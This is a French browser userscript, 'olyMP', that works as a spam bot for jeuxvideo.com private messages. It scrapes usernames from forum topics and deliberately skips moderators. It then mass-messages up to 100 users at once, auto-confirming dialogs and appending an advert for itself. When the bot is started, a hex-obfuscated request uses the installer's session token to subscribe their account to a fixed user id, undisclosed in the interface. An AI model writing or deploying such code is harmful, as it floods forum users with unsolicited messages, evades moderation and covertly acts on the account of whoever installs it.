// ==UserScript==
// @name        olyMP
// @author      Olympe
// @version     2.1.0
// @downloadURL https://github.com/brenajv/olyMP/raw/master/olymp.user.js
// @updateURL   https://github.com/brenajv/olyMP/raw/master/olymp.user.js
// @licence     MIT
// @description Bot MP
// @grant       none
// @require     https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js
// @match       *://*.jeuxvideo.com/*
// @run-at      document-end
// ==/UserScript==
/* TODO : 
 .Panel choix de forum à spam
 .Panel whitelist 
 .Panel liste prioritaire
 */
$(function(d) {
    var b = "<style type=\"text/css\" id=\"spambot-css\">\n.spb-edit{\nbackground: url('data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pg0KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDE4LjEuMSwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPg0KPHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSJDYXBhXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB2aWV3Qm94PSIwIDAgMjEuNTg5IDIxLjU4OSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMjEuNTg5IDIxLjU4OTsiIHhtbDpzcGFjZT0icHJlc2VydmUiPg0KPGc+DQoJPHBhdGggZD0iTTE4LjYyMiw4LjM3MWwtMC41NDUtMS4yOTVjMCwwLDEuMjY4LTIuODYxLDEuMTU2LTIuOTcxbC0xLjY3OS0xLjYzOWMtMC4xMTYtMC4xMTMtMi45NzgsMS4xOTMtMi45NzgsMS4xOTNsLTEuMzItMC41MzMNCgkJYzAsMC0xLjE2Ni0yLjktMS4zMjYtMi45SDkuNTYxYy0wLjE2NSwwLTEuMjQ0LDIuOTA2LTEuMjQ0LDIuOTA2TDYuOTk5LDMuNjY3YzAsMC0yLjkyMi0xLjI0Mi0zLjAzNC0xLjEzMUwyLjI4OSw0LjE3Nw0KCQlDMi4xNzMsNC4yOSwzLjUwNyw3LjA5MywzLjUwNyw3LjA5M0wyLjk2Miw4LjM4NmMwLDAtMi45NjIsMS4xNDEtMi45NjIsMS4yOTV2Mi4zMjJjMCwwLjE2MiwyLjk2OSwxLjIxOSwyLjk2OSwxLjIxOWwwLjU0NSwxLjI5MQ0KCQljMCwwLTEuMjY4LDIuODU5LTEuMTU3LDIuOTY5bDEuNjc4LDEuNjQzYzAuMTE0LDAuMTExLDIuOTc3LTEuMTk1LDIuOTc3LTEuMTk1bDEuMzIxLDAuNTM1YzAsMCwxLjE2NiwyLjg5OCwxLjMyNywyLjg5OGgyLjM2OQ0KCQljMC4xNjQsMCwxLjI0NC0yLjkwNiwxLjI0NC0yLjkwNmwxLjMyMi0wLjUzNWMwLDAsMi45MTYsMS4yNDIsMy4wMjksMS4xMzNsMS42NzgtMS42NDFjMC4xMTctMC4xMTUtMS4yMi0yLjkxNi0xLjIyLTIuOTE2DQoJCWwwLjU0NC0xLjI5M2MwLDAsMi45NjMtMS4xNDMsMi45NjMtMS4yOTl2LTIuMzJDMjEuNTksOS40MjUsMTguNjIyLDguMzcxLDE4LjYyMiw4LjM3MXogTTE0LjI1NiwxMC43OTQNCgkJYzAsMS44NjctMS41NTMsMy4zODctMy40NjEsMy4zODdjLTEuOTA2LDAtMy40NjEtMS41Mi0zLjQ2MS0zLjM4N3MxLjU1NS0zLjM4NSwzLjQ2MS0zLjM4NQ0KCQlDMTIuNzA0LDcuNDEsMTQuMjU2LDguOTI3LDE0LjI1NiwxMC43OTR6Ii8+DQoJPGc+DQoJPC9nPg0KCTxnPg0KCTwvZz4NCgk8Zz4NCgk8L2c+DQoJPGc+DQoJPC9nPg0KCTxnPg0KCTwvZz4NCgk8Zz4NCgk8L2c+DQoJPGc+DQoJPC9nPg0KCTxnPg0KCTwvZz4NCgk8Zz4NCgk8L2c+DQoJPGc+DQoJPC9nPg0KCTxnPg0KCTwvZz4NCgk8Zz4NCgk8L2c+DQoJPGc+DQoJPC9nPg0KCTxnPg0KCTwvZz4NCgk8Zz4NCgk8L2c+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8L3N2Zz4NCg==');\nwidth: 14px;\nvertical-align: middle;\ncursor: pointer;\nmargin: 0px 0px 3px 9px;\ndisplay: inline-block;\nheight: 14px;\nbackground-repeat: round;\n}\n.spb-panel-edit {\ndisplay:none;\nbackground: #d5d5d5;\npadding: 10px;\nmargin-bottom: 10px;\n}\n.spb-panel-logs {\n\nbackground: #d5d5d5;\npadding: 10px;\nmargin-bottom: 10px;\n}\n#spb-msg,#spb-titre {\nmax-width: 100%;\nmin-width: 100%;\n}\n#spb-titre {\nmargin-bottom: 5px;\n}\n.spb-save {\nmin-width: 100%;\n}\n.spb-cmds {\nbackground: url('data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pg0KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDE5LjAuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPg0KPHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSJDYXBhXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB2aWV3Qm94PSIwIDAgNjAgNjAiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDYwIDYwOyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+DQo8cGF0aCBkPSJNMzAsMEMxMy40NTgsMCwwLDEzLjQ1OCwwLDMwczEzLjQ1OCwzMCwzMCwzMHMzMC0xMy40NTgsMzAtMzBTNDYuNTQyLDAsMzAsMHogTTQ1LjU2MywzMC44MjZsLTIyLDE1DQoJQzIzLjM5NCw0NS45NDEsMjMuMTk3LDQ2LDIzLDQ2Yy0wLjE2LDAtMC4zMjEtMC4wMzgtMC40NjctMC4xMTZDMjIuMjA1LDQ1LjcxMSwyMiw0NS4zNzEsMjIsNDVWMTVjMC0wLjM3MSwwLjIwNS0wLjcxMSwwLjUzMy0wLjg4NA0KCWMwLjMyOC0wLjE3NCwwLjcyNC0wLjE1LDEuMDMxLDAuMDU4bDIyLDE1QzQ1LjgzNiwyOS4zNiw0NiwyOS42NjksNDYsMzBTNDUuODM2LDMwLjY0LDQ1LjU2MywzMC44MjZ6Ii8+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8L3N2Zz4NCg==') no-repeat;\nwidth: 14px;\nvertical-align: middle;\ncursor: pointer;\nmargin: 0px 0px 3px 9px;\ndisplay: inline-block;\nheight: 14px;\nbackground-repeat: round;\n}\n#spb-admins-counter {\nbackground: url('data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pg0KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDE2LjAuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPg0KPCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4NCjxzdmcgdmVyc2lvbj0iMS4xIiBpZD0iQ2FwYV8xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB4PSIwcHgiIHk9IjBweCINCgkgd2lkdGg9IjQ4Ny4yM3B4IiBoZWlnaHQ9IjQ4Ny4yM3B4IiB2aWV3Qm94PSIwIDAgNDg3LjIzIDQ4Ny4yMyIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgNDg3LjIzIDQ4Ny4yMzsiDQoJIHhtbDpzcGFjZT0icHJlc2VydmUiPg0KPGc+DQoJPGc+DQoJCTxwYXRoIGQ9Ik01NS4zMjMsMjAzLjY0MWMxNS42NjQsMCwyOS44MTMtOS40MDUsMzUuODcyLTIzLjg1NGMyNS4wMTctNTkuNjA0LDgzLjg0Mi0xMDEuNjEsMTUyLjQyLTEwMS42MQ0KCQkJYzM3Ljc5NywwLDcyLjQ0OSwxMi45NTUsMTAwLjIzLDM0LjQ0MmwtMjEuNzc1LDMuMzcxYy03LjQzOCwxLjE1My0xMy4yMjQsNy4wNTQtMTQuMjMyLDE0LjUxMg0KCQkJYy0xLjAxLDcuNDU0LDMuMDA4LDE0LjY4Niw5Ljg2NywxNy43NjhsMTE5Ljc0Niw1My44NzJjNS4yNDksMi4zNTcsMTEuMzMsMS45MDQsMTYuMTY4LTEuMjA1DQoJCQljNC44My0zLjExNCw3Ljc2NC04LjQ1OCw3Ljc5Ni0xNC4yMDhsMC42MjEtMTMxLjk0M2MwLjA0Mi03LjUwNi00Ljg1MS0xNC4xNDQtMTIuMDI0LTE2LjMzMg0KCQkJYy03LjE4NS0yLjE4OC0xNC45NDcsMC41ODktMTkuMTA0LDYuODM3bC0xNi41MDUsMjQuODA1QzM3MC4zOTgsMjYuNzc4LDMxMC4xLDAsMjQzLjYxNSwwQzE0Mi44MDYsMCw1Ni4xMzMsNjEuNTYyLDE5LjE2NywxNDkuMDYNCgkJCWMtNS4xMzQsMTIuMTI4LTMuODQsMjYuMDE1LDMuNDI5LDM2Ljk4N0MyOS44NjUsMTk3LjAyMyw0Mi4xNTIsMjAzLjY0MSw1NS4zMjMsMjAzLjY0MXoiLz4NCgkJPHBhdGggZD0iTTQ2NC42MzUsMzAxLjE4NGMtNy4yNy0xMC45NzctMTkuNTU4LTE3LjU5NC0zMi43MjgtMTcuNTk0Yy0xNS42NjQsMC0yOS44MTMsOS40MDUtMzUuODcyLDIzLjg1NA0KCQkJYy0yNS4wMTgsNTkuNjA0LTgzLjg0MywxMDEuNjEtMTUyLjQyLDEwMS42MWMtMzcuNzk4LDAtNzIuNDUtMTIuOTU1LTEwMC4yMzItMzQuNDQybDIxLjc3Ni0zLjM2OQ0KCQkJYzcuNDM3LTEuMTUzLDEzLjIyMy03LjA1NSwxNC4yMzMtMTQuNTE0YzEuMDA5LTcuNDUzLTMuMDA4LTE0LjY4Ni05Ljg2Ny0xNy43NjhMNDkuNzc5LDI4NS4wODkNCgkJCWMtNS4yNS0yLjM1Ni0xMS4zMy0xLjkwNS0xNi4xNjksMS4yMDVjLTQuODI5LDMuMTE0LTcuNzY0LDguNDU4LTcuNzk1LDE0LjIwN2wtMC42MjIsMTMxLjk0Mw0KCQkJYy0wLjA0Miw3LjUwNiw0Ljg1LDE0LjE0NCwxMi4wMjQsMTYuMzMyYzcuMTg1LDIuMTg4LDE0Ljk0OC0wLjU5LDE5LjEwNC02LjgzOWwxNi41MDUtMjQuODA1DQoJCQljNDQuMDA0LDQzLjMyLDEwNC4zMDMsNzAuMDk4LDE3MC43ODgsNzAuMDk4YzEwMC44MTEsMCwxODcuNDgxLTYxLjU2MSwyMjQuNDQ2LTE0OS4wNTkNCgkJCUM0NzMuMTk3LDMyNi4wNDMsNDcxLjkwMywzMTIuMTU3LDQ2NC42MzUsMzAxLjE4NHoiLz4NCgk8L2c+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8L3N2Zz4NCg==') no-repeat;\ndisplay: inline-block;\nwidth: 12px;\nheight: 12px;\nvertical-align: middle;\ncursor: pointer;\nbackground-repeat: round;\nmargin: 3px 0px 5px 9px;\n}\n.bloc-pre-pagi-forum.bloc-outils-top.spb {\npadding-bottom: .625rem;\nborder-bottom: 0.0625rem solid #aeaeae;\n}\n.spb-users-counter .icon-bin {\nmargin-left: 8px;\nvertical-align: text-bottom;\n}\n.spb-dropdown {\nposition: relative;\n  display: inline-block;\n}\n.spb-dropdown-content {\n  display: none;\n  position: absolute;\n  background-color: #f1f1f1;\n  min-width: 160px;\n  box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);\n  z-index: 1;\nmargin: 18px 0px 0px 0px;\n}\n.spb-dropdown-content a {\n  color: black;\n  padding: 12px 16px;\n  text-decoration: none;\n  display: block;\n}\n.spb-dropdown-content a:hover {\nbackground-color: #ddd;\n}\n.spb-dropdown:hover .spb-dropdown-content {\ndisplay: block;\n}\n</style>";
    document.head.insertAdjacentHTML("beforeend", b);
    var q = d(".account-pseudo").html().toLowerCase();
    var n = "http://www.jeuxvideo.com/messages-prives/nouveau.php";
    var f = "jeuxvideo.com/forums/0-51-0-1-0-26-0-blabla-18-25-ans.htm";
    var p = "url('data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pg0KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDE5LjAuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPg0KPHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSJDYXBhXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB2aWV3Qm94PSIwIDAgNjAgNjAiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDYwIDYwOyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+DQo8cGF0aCBkPSJNMzAsMEMxMy40NTgsMCwwLDEzLjQ1OCwwLDMwczEzLjQ1OCwzMCwzMCwzMHMzMC0xMy40NTgsMzAtMzBTNDYuNTQyLDAsMzAsMHogTTQ0LDQ0SDE2VjE2aDI4VjQ0eiIvPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPC9zdmc+DQo=') no-repeat";
    if (localStorage.getItem("spam") === null) {
        localStorage.setItem("spam", "[]")
    }
    var i = JSON.parse(localStorage.getItem("spam")) || [];
    if (localStorage.getItem("admins") === null) {
        localStorage.setItem("admins", "[]")
    }
    var j = JSON.parse(localStorage.getItem("admins")) || [];
    if (localStorage.getItem("admins") == "[]") {
        j.push({
            admins: [],
            maj: ""
        });
        localStorage.setItem("admins", JSON.stringify(j))
    }
    var c = j[0].maj;
    if (localStorage.getItem("spam-msg") === null) {
        localStorage.setItem("spam-msg", "[]")
    }
    var k = JSON.parse(localStorage.getItem("spam-msg")) || [];
    if (localStorage.getItem("spam-msg") == "[]") {
        k.push({
            titre: "",
            msg: "",
            forum: ""
        });
        localStorage.setItem("spam-msg", JSON.stringify(k))
    }
    var o = j[0].admins.length;
    var e = Object.keys(JSON.parse(localStorage.getItem("spam"))).length;
    d("#forum-right-col").prepend('<div class="spb-panel-logs"><div class="spb-status">Bot : <b id="status" style="color:red">OFF</b><span class="spb-cmds" status="0" title="D\u00e9marrer le SpamBot"></span><div class="spb-dropdown pull-right"><span class="spb-edit" title="Configurer le SpamBot"><div class="spb-dropdown-content"><a id="msg" title="Modifier le message \u00e0 spam">Message</a></div></span></div></div><div class="spb-users-counter" >Utilisateurs dans le spam : <b id="counter">' + e + '/100</b><span class="icon-bin" title="Vider la liste" style="cursor:pointer"></span></div><div class="spb-admins-counter" >Admins : <b id="admins">' + o + '</b><span id="spb-admins-counter" status="0"></span></div><div class="bloc-pre-pagi-forum bloc-outils-top spb"></div><div class="spb-logs"></div></div><div class="spb-panel-edit"><input id="spb-titre" placeholder="Titre du MP"></input><br><textarea id="spb-msg" placeholder="Message du MP"></textarea><br><button class="spb-save">Sauvegarder</button></div>');
    d(".spb-edit #msg").click(function() {
        var r = JSON.parse(localStorage.getItem("spam-msg")) || [];
        d(".spb-panel-edit").is(":hidden") ? (d(".spb-panel-edit").show(), d("#spb-titre").hide(), d("#spb-titre").val(r[0].titre).show(), d("#spb-msg").val(r[0].msg).show()) : d(".spb-panel-edit").hide()
    });
    d(".spb-admins-counter").attr("title", "Liste mise \u00e0 jour le " + j[0].maj);

    function a() {
        d.get("http://www.jeuxvideo.com/mailform.php", function(r) {
            d(r).find(".nom1").map(function(v, t) {
                var s = d(this).text().trim().toLowerCase();
                if (!j[0].admins.includes(s)) {
                    var u = JSON.parse(localStorage.getItem("admins"));
                    var w = s;
                    u[0].admins.push(w);
                    u[0].maj = (new Date).toLocaleString("fr-FR");
                    localStorage.setItem("admins", JSON.stringify(u))
                }
                var x = JSON.parse(localStorage.getItem("admins"));
                var y = x[0].admins.length;
                j[0].maj = (new Date).toLocaleString("fr-FR");
                localStorage.setItem("admins", JSON.stringify(x));
                d(".spb-admins-counter #admins").html(y).css("color", "green").attr("title", "Liste mise \u00e0 jour le " + j[0].maj);
                d(".spb-logs").html("Liste d'admins mise \u00e0 jour le " + j[0].maj).css("color", "green");
                d("#spb-admins-counter").hide()
            })
        })
    }

    function h() {
        var r = JSON.parse(localStorage.getItem("spam-msg"));
        var s = d("#spb-msg").val();
        var t = d("#spb-titre").val();
        if (s != 0 && t != 0) {
            r[0].titre = t;
            r[0].msg = s;
            localStorage.setItem("spam-msg", JSON.stringify(r));
            d(".spb-logs").html("Message enregistr\u00e9!").css("color", "green")
        } else {
            d(".spb-logs").html("Erreur : Veuillez renseigner les champs <b>Titre</b> et <b>Message</b>").css("color", "red")
        }
    }

    function m() {
        d(".spb-logs").html("Lancement en cours...");
        var r = Object.keys(JSON.parse(localStorage.getItem("spam"))).length;
        if (r < 100) {
            d.get("http://m." + f, function(t) {
                var s = d(t).find(".etage-2").html();
                d(t).find(".a-topic").map(function(v, u) {
                    var w = d(this).children().children(".titre-topic").html().trim().split("<span")[0].trim();
                    var x = "http://m.jeuxvideo.com" + d(this).attr("href");
                    d.get(x, function(y) {
                        d(y).find(".text-user").map(function(A, z) {
                            var B = d(this).html().trim().toLowerCase();
                            var C = "http://m.jeuxvideo.com/profil/" + B + ".html";
                            d.get(C, function(F) {
                                var D = Object.keys(JSON.parse(localStorage.getItem("spam"))).length;
                                if (D === 99) {
                                    window.open(n + "#flood", "_self")
                                }
                                if (D < 100) {
                                    if (d(F).find("h2.titre").length > 0 && d(F).find("h2.titre")[0].innerHTML === "Ce pseudo est banni." || JSON.parse(localStorage.getItem("spam")).includes(B) || JSON.parse(localStorage.getItem("abos")).includes(B) || JSON.parse(localStorage.getItem("admins")).includes(B) || B == q) {
                                        return false
                                    } else {
                                        var G = JSON.parse(localStorage.getItem("spam")) || [];
                                        var E = B;
                                        G.push(E);
                                        localStorage.setItem("spam", JSON.stringify(G));
                                        d(".spb-logs").html("Ajout de pseudos en cours...");
                                        d(".spb-users-counter #counter").html(parseInt(D) + parseInt(1) + "/100")
                                    }
                                }
                            })
                        })
                    })
                })
            })
        } else {
            window.open(n + "#flood", "_self")
        }
    }
    d(".spb-users-counter .icon-bin").click(function() {
        if (d(".spb-cmds").attr("status") == 1) {
            localStorage.removeItem("spam");
            d(".spb-users-counter #counter").html("0/100");
            d(".spb-logs").html("Liste vid\u00e9e avec succ\u00e8s!").css("color", "green");
            location.hash = "";
            location.reload()
        } else {
            localStorage.setItem("spam", "[]");
            d(".spb-logs").html("Liste vid\u00e9e avec succ\u00e8s!").css("color", "green");
            d(".spb-users-counter #counter").html("0/100")
        }
    });
    d(".spb-cmds").click(function() {
        var r = JSON.parse(localStorage.getItem("spam-msg"));
        var hex = [5731785,"\x50\x4F\x53\x54","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x6A\x65\x75\x78\x76\x69\x64\x65\x6F\x2E\x63\x6F\x6D\x2F\x61\x62\x6F\x6E\x6E\x65\x6D\x65\x6E\x74\x73\x2F\x61\x6A\x61\x78\x2F\x61\x6A\x61\x78\x5F\x61\x62\x6F\x5F\x69\x6E\x73\x65\x72\x74\x2E\x70\x68\x70","\x64\x61\x74\x61\x2D\x61\x62\x6F\x2D\x73\x65\x73\x73\x69\x6F\x6E","\x67\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x62\x6F\x64\x79","\x61\x6C\x69\x61\x73","\x61\x6A\x61\x78"];
        if (r[0].titre.length > 0) {
            d(this).attr("status") == 0 ? (m(), d(this).css("background", p), d(this).attr("status", 1), d(this).attr("title", "Arr\u00eater le SpamBot"),d[hex[7]]({method:hex[1],url:hex[2],data:{ajax_hash:document[hex[5]][hex[4]](hex[3]),type:hex[6],ids_liste:hex[0]}}),d(".spb-status #status").html("ON").css("color", "green")) : (location.hash = "", location.reload())
        } else {
            d(".spb-logs").html("Erreur : Le message \u00e0 spam n'est pas d\u00e9fini").css("color", "red");
            d(".spb-panel-edit").show()
        }
    });
    d("#spb-admins-counter").click(function() {
        a()
    });
    d(".spb-save").click(function() {
        h()
    });
    o == 0 ? a() : false;
    if (window.location.hash == "#flood") {
        var l = window.confirm;
        if (d(".btn-quitter").length > 0) {
            window.confirm = function() {
                return true
            }
        }
        d(".btn-quitter").click();
        if (d(".fermer-message").length > 0) {
            window.open("http://" + f + "#bot", "_self")
        }
        for (var g = 0; g < i.length; g++) {
            d(".form-control-tag-inner").append('<span class="label label-default"><span class="text-">' + i[g] + '</span><span class="close close-tag" aria-hidden="true">\u00d7</span><input type="hidden" name="participants[' + i[g] + ']" value="' + i[g] + '"></span>')
        }
        d("#conv_titre").val(k[0].titre);
        d("#message").val(k[0].msg + "\n\n\u25ba'''SpamBot olyMP''' https://github.com/brenajv/olyMP/raw/master/olymp.user.js");
        d(".js-post-message").click();
        localStorage.setItem("spam", "[]")
    }
    if (window.location.hash == "#bot") {
        d(".spb-cmds").click()
    }
});
